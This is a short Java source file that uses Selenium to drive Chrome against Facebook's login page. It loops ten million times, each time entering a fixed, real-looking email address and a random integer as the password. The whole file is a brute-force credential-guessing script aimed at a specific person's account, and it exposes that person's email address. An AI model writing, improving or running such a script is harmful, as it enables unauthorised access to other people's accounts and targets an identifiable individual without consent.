package com.selinium;

import java.util.Random;

import org.openqa.selenium.By.ById;
import org.openqa.selenium.By.ByName;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

public class Facebook {
public static void main(String[] args) {
	Random rm=new Random(10000000);
	int at=rm.nextInt();

	
	System.setProperty("webdriver.chrome.driver","C:\\Users\\dac\\Documents\\chromedriver.exe");
	WebDriver driver=new ChromeDriver();
	String url="https://www.facebook.com";
	for(int i=0;i<10000000;i++)
    {
		String exptitile = "facebook";
		String actualtile = "";
		driver.get(url);
        
		driver.findElement(ByName.name("email")).sendKeys("jundare.onkar12@gmail.com");
		driver.findElement(ByName.name("pass")).sendKeys(Integer.toString(rm.nextInt()));
		driver.findElement(ById.id("u_0_2")).submit();
        }
}
}
